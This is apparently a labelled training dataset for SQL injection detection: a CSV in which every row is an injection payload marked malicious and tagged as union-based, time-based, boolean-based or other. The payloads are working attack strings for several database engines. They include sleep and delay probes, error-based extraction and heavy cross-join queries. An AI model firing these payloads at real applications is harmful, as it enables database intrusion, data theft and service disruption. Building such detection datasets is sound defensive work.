Query,Label,Attack_Type
"1'   )    )    as lizu where 7691  =  7691 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,Other_Malicious
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,Other_Malicious
"1'+  (  select hspl where 4530  =  4530 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,Other_Malicious
"1',  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,Other_Malicious
1   )    )    as cwyb where 3633  =  3633,1,Other_Malicious
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1,Union-based
"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",1,Other_Malicious
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,Other_Malicious
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""jfgk"" like ""jfgk",1,Other_Malicious
"-5073""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""kbab"" like ""kbab",1,Other_Malicious
select   (  case when   (  4774  =  1535  )   then 4774 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,Other_Malicious
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,1,Time-based
1' in boolean mode  )   order by 1#,1,Other_Malicious
"1  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,Other_Malicious
"1%""  )   and 8626  =  3626#",1,Boolean-based
"iif  (  5214  =  7412,1,1/0  )  ",1,Other_Malicious
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'nuil' like 'nuil",1,Other_Malicious
"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,Other_Malicious
1'||  (  select 'rhcv' where 6228  =  6228,1,Other_Malicious
select pg_sleep  (  5  )   and    (    (   4382  =  4382,1,Time-based
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'oacz'  =  'oacz",1,Other_Malicious
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",1,Union-based
"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",1,Other_Malicious
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1,Other_Malicious
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,Other_Malicious
"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1,Other_Malicious
"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",1,Other_Malicious
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",1,Other_Malicious
"1   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   5776  =  5776",1,Other_Malicious
"1   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  9401  =  9401",1,Other_Malicious
1 rlike sleep  (  5  )  -- muhp,1,Time-based
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,1,Time-based
1  )   as ratg where 3033  =  3033 union all select null--,1,Union-based
-7404' where 1536  =  1536 order by 1#,1,Other_Malicious
"1'  )   union all select null,null,null,null,null,null,null,null,null,null#",1,Union-based
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,Time-based
"1 union all select null,null,null--",1,Union-based
1'  )   as rhvm where 1420  =  1420,1,Other_Malicious
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'edcm' like 'edcm",1,Other_Malicious
-2756' where 6156  =  6156 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,Other_Malicious
1'  )   union all select null#,1,Union-based
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",1,Time-based
"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",1,Union-based
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,Other_Malicious
"-8129'   )    )     )   union all select 4531,4531,4531#",1,Union-based
"1""  )   union all select null,null,null,null,null,null,null,null,null#",1,Union-based
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,Other_Malicious
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",1,Other_Malicious
1'  )   as gogu where 4338  =  4338 union all select null#,1,Union-based
"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1,Union-based
"1,  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,Other_Malicious
"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""ieuj"" like ""ieuj",1,Other_Malicious
1 where 2384  =  2384 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,Time-based
"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",1,Other_Malicious
"1""  )   union all select null,null,null,null,null,null,null,null,null--",1,Union-based
"1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--",1,Union-based
"1"" where 9725  =  9725",1,Other_Malicious
"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",1,Union-based
"1%"" union all select null,null,null,null,null,null--",1,Union-based
"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,Other_Malicious
"1""  )   as ipxg where 4031  =  4031 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,Other_Malicious
"1'  )   as jysm where 8961  =  8961 union all select null,null#",1,Union-based
1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,Other_Malicious
"1""  )   and sleep  (  5  )   and   (  ""ytof""  =  ""ytof",1,Time-based
"1""  )   as pobe where 1704  =  1704",1,Other_Malicious
"1"" where 9332  =  9332 union all select null,null,null,null,null,null,null,null,null--",1,Union-based
-2432'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'ejhp'  =  'ejhp,1,Other_Malicious
-8641%' order by 1--,1,Other_Malicious
"-3249'   )    )     )   union all select 6309,6309#",1,Union-based
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'yqbo'  =  'yqbo,1,Time-based
1'  )   as nexa where 6740  =  6740,1,Other_Malicious
"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""rvub"" like ""rvub",1,Other_Malicious
"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",1,Union-based
"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",1,Union-based
"1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1,Other_Malicious
1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,Time-based
"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",1,Union-based
-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,Other_Malicious
"1' and make_set  (  8403  =  8403,8899  )   and 'niux'  =  'niux",1,Other_Malicious
end and   (  4610  =  4610,1,Other_Malicious
"1   )    )    union all select null,null,null--",1,Union-based
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,1,Time-based
"1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#",1,Union-based
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'fowu' like 'fowu",1,Other_Malicious
1'  )   where 5280  =  5280 and 4595  =  4595#,1,Boolean-based
"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,Other_Malicious
1  )   where 3565  =  3565 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,Time-based
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,1,Time-based
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,Time-based
"1"" where 9760  =  9760 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,Time-based
"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",1,Union-based
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""squx"" like ""squx",1,Other_Malicious
"1""   )    )     )   and 4967  =  8866 and    (    (     (  ""jzyn"" like ""jzyn",1,Boolean-based
"1""  )   as oztl where 6655  =  6655 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,Other_Malicious
if  (  7899  =  7899  )   select 7899 else drop function zbbp--,1,Other_Malicious
"1""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""uwdz""  =  ""uwdz",1,Other_Malicious
"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",1,Union-based
"1,iif  (  6625  =  6625,1,1/0  )  ",1,Other_Malicious
"-9922'   )    )    union all select 2193,2193,2193--",1,Union-based
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,Other_Malicious
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3",1,Other_Malicious
"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",1,Other_Malicious
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'uqfs'  =  'uqfs,1,Other_Malicious
"-9959""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""vcwc""  =  ""vcwc",1,Other_Malicious
"select * from generate_series  (  7610,7610,case when   (  7610  =  9416  )   then 1 else 0 end  )   limit 1--",1,Other_Malicious
"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",1,Union-based
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",1,Other_Malicious
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg",1,Other_Malicious
"1 where 2751  =  2751 union all select null,null,null,null--",1,Union-based
"1%""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""%""  =  """,1,Other_Malicious
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  3530  =  3530,1,Other_Malicious
"1   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,Other_Malicious
1'||  (  select 'znba' where 8323  =  8323,1,Other_Malicious
waitfor delay '0:0:5' and    (    (     (  8981  =  8981,1,Time-based
"-6948""   )    )    as ojjl where 1300  =  1300 or 6872  =  6872--",1,Boolean-based
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",1,Other_Malicious
"1""   )    )    as ndbk where 5042  =  5042 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,Time-based
"-1917""  )   or 8571  =  8571--",1,Boolean-based
"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt",1,Other_Malicious
1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,1,Other_Malicious
select   (  case when   (  2350  =  8682  )   then 2350 else 1/  (  select 0  )   end  )  --,1,Other_Malicious
select pg_sleep  (  5  )   and   (  '%'  =  ',1,Time-based
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",1,Time-based
"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1,Other_Malicious
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",1,Other_Malicious
-3436  )   or 9281  =  3172,1,Boolean-based
"-1907""   )    )    or 2782  =  3591",1,Boolean-based
"1%"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,Other_Malicious
"iif  (  2869  =  9448,1,1/0  )  ",1,Other_Malicious
